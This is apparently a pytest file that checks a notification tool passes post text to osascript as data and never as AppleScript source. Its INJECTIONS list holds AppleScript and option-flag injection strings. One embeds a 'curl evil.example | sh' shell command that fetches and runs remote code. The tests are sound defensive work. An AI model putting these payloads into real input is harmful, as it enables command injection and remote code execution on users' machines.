"""The notify tool never turns post text into AppleScript source. Runs offline, without macOS."""

import asyncio

import pytest

from modules import tools

INJECTIONS = [
    '" & do shell script "x',
    'Hype" & (do shell script "curl evil.example | sh") & "',
    '-e',
    '-e do shell script "x"',
    'line one\nend run\non run argv\ndo shell script "x"',
    "¬\" buttons {\"x\"}",
]


def split(command: list[str]) -> tuple[str, list[str]]:
    """(script source, run-handler arguments): osascript reads -e pairs until the first plain argument."""
    i, source = 1, []
    while command[i] == "-e":
        source.append(command[i + 1])
        i += 2
    return "\n".join(source), command[i:]


def script_source(command: list[str]) -> str:
    return split(command)[0]


def script_arguments(command: list[str]) -> list[str]:
    return split(command)[1]


@pytest.mark.parametrize("payload", INJECTIONS)
def test_post_text_is_passed_as_data_not_script(payload):
    command = tools.alert_command(payload, payload, "OK")

    assert command[0] == "osascript"
    assert script_source(command) == "\n".join(tools.ALERT_SCRIPT)
    assert payload not in script_source(command)
    assert script_arguments(command) == ["OK", payload, payload]


def test_the_first_script_argument_is_never_option_like():
    for button in ("Urgent!", "Noted", "OK"):
        assert not script_arguments(tools.alert_command("-e x", "-e y", button))[0].startswith("-")


@pytest.mark.parametrize("payload", INJECTIONS)
def test_notify_tool_runs_osascript_with_the_payload_as_data(monkeypatch, payload):
    commands = []

    class Done:
        returncode = 0
        stderr = ""

    def run(command, **kwargs):
        commands.append(command)
        return Done()

    monkeypatch.setattr(tools.subprocess, "run", run)
    monkeypatch.setattr(tools.tts_notifier, "notify", lambda title, message: False)

    result = asyncio.run(
        tools.notify_tool.handler({"title": payload, "message": payload, "urgency": "critical"})
    )

    assert "is_error" not in result
    [command] = commands
    assert script_source(command) == "\n".join(tools.ALERT_SCRIPT)
    assert script_arguments(command) == ["Urgent!", payload, payload]
